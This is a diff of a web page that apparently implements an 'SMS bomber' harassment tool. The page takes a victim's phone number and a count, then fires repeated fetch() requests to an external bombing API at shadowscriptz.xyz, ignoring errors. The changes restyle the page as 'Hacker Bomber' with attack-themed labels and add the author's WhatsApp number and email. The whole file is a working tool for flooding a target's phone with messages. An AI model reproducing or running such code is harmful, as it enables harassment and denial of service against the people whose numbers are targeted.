@@ -1,74 +1,103 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Raza Bomber</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Hacker Bomber</title>
   <style>
     body {
-      background: #0f0f0f;
-      color: white;
-      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      background: #0a0a0a;
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
       display: flex;
       flex-direction: column;
       align-items: center;
-      padding: 30px;
     }
-    .container {
-      background: #1a1a1a;
-      padding: 20px;
-      border-radius: 15px;
-      box-shadow: 0 0 10px #00ffcc;
-      max-width: 400px;
-      width: 100%;
-    }
+
     h1 {
       text-align: center;
-      color: #00ffcc;
+      font-size: 3em;
+      color: #00ff00;
+      text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
     }
-    input, button {
+
+    .container {
+      background: rgba(0, 0, 0, 0.9);
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px #00ff00;
       width: 100%;
-      padding: 10px;
-      margin-top: 15px;
-      border: none;
-      border-radius: 10px;
-      font-size: 16px;
-    }
-    input {
-      background: #333;
-      color: white;
-    }
-    button {
-      background: #00ffcc;
-      color: black;
-      cursor: pointer;
-      font-weight: bold;
-    }
-    .footer {
-      text-align: center;
+      max-width: 400px;
       margin-top: 30px;
     }
+
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 15px;
+      background: #111;
+      color: #00ff00;
+      border: 2px solid #00ff00;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+
+    input::placeholder {
+      color: #00ff00;
+      opacity: 0.6;
+    }
+
+    button {
+      background: #000;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background: #00ff00;
+      color: black;
+      box-shadow: 0 0 10px #00ff00;
+    }
+
+    .footer {
+      margin-top: 40px;
+      text-align: center;
+      font-size: 14px;
+      color: #ccc;
+    }
+
     .footer a {
-      color: #00ffcc;
+      color: #ff0040;
       text-decoration: none;
       font-weight: bold;
+    }
+
+    .footer a:hover {
+      color: #ff0000;
+      text-shadow: 0 0 5px #ff0000;
     }
   </style>
 </head>
 <body>
+
+  <h1>💀 Hacker<br>Bomber 💣</h1>
+
   <div class="container">
-    <h1>Raza<br>Bomber</h1>
-    <input type="text" id="number" placeholder="Enter Number (e.g. 03001234567)" />
-    <input type="number" id="count" placeholder="How many times?" />
-    <button onclick="startBombing()">💣 Bomb</button>
+    <input type="text" id="number" placeholder="Target Number e.g. 03001234567" />
+    <input type="number" id="count" placeholder="How many bombs?" />
+    <button onclick="startBombing()">💣 INITIATE ATTACK</button>
   </div>
 
   <div class="footer">
-    <p>Contact us: 
+    <p>💬 Message Me: 
       <a href="https://wa.me/447354208303?text=Hello%20%F0%9F%A4%97" target="_blank">
-        +44 7354 208303 (WhatsApp)
+        WhatsApp (+44 7354 208303)
       </a>
     </p>
+    <p>📧 Email: <a href="mailto:alijanhunyaar@gmail.com">alijanhunyaar@gmail.com</a></p>
   </div>
 
   <script>
@@ -77,11 +106,10 @@
       const count = parseInt(document.getElementById('count').value);
       
       if (!numberInput || isNaN(count) || count <= 0) {
-        alert("Please enter a valid number and bombing count.");
+        alert("⚠️ Enter valid number and count.");
         return;
       }
 
-      // Convert to 92 format if starts with 03
       let number = numberInput;
       if (number.startsWith("03")) {
         number = "92" + number.slice(1);
@@ -89,11 +117,12 @@
 
       for (let i = 0; i < count; i++) {
         fetch(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`)
-          .catch(() => {}); // Ignore errors
+          .catch(() => {});
       }
 
-      alert("Bombing started successfully.");
+      alert("💣 Attack sequence started.");
     }
   </script>
+
 </body>
 </html>
